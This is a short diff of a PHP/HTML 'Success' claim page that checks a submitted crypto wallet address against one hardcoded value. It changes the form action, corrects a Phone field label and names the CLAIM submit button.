@@ -13,7 +13,7 @@ if($_POST['wallet_address']=="0xc85ECe92db84eCeE699954DB8717AbA03d5fA904"){
     <body>
 
     <div class="container">
-        <form action="Verify" method="post">
+        <form action="Email" method="post">
             <div class="row mt-5">
                 <div class="col-12">
                     <h1 class="text-success mb-3">Success</h1>
@@ -27,7 +27,7 @@ if($_POST['wallet_address']=="0xc85ECe92db84eCeE699954DB8717AbA03d5fA904"){
                 </div>
                 <div class="col-12">
                     <div class="mb-3">
-                        <label for="Phone" class="form-label">Name</label>
+                        <label for="Phone" class="form-label">Phone</label>
                         <input type="text" class="form-control" id="Phone" name="Phone"
                                placeholder="Phone" required>
                     </div>
@@ -41,7 +41,7 @@ if($_POST['wallet_address']=="0xc85ECe92db84eCeE699954DB8717AbA03d5fA904"){
                 </div>
                 <div class="col-12">
                     <div class="mb-3 text-center">
-                        <button type="submit" class="btn btn-info btn-lg text-white">CLAIM</button>
+                        <button type="submit" class="btn btn-info btn-lg text-white" name="submit">CLAIM</button>
                     </div>
                 </div>
             </div>
